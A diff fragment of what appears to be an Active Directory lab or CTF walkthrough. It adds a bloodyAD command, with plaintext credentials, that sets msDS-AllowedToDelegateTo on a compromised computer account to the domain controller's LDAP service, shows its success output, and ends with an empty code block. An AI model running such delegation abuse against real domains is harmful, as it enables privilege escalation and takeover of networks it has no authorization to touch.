@@ -808,3 +808,13 @@ This user is now compromised
 
 This new user has GenericWrite on the `helpdesk01$` this should mean i can configure constrained delegation
 
+```python
+bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u 'svc_delegate' -p 'Password123!' -k set object 'helpdesk01$' msDS-AllowedToDelegateTo -v 'ldap/DC.hsm-defense.local'       
+[+] helpdesk01$'s msDS-AllowedToDelegateTo has been updated
+```
+
+First of all ill setup the constrained delegation
+
+```python
+
+```
